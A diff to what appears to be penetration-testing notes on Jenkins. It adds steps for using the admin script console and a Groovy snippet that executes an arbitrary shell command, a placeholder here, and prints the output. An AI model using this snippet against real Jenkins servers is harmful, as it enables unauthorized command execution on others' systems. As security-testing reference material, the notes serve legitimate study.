@@ -84,4 +84,12 @@ Jenkins.
 
 - If we have admin access (default installation before 2.x)
 - Navigate to `http://<jenkins_server/script`
-- 
+- Now paste in below command
+
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = '[INSERT COMMAND]'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
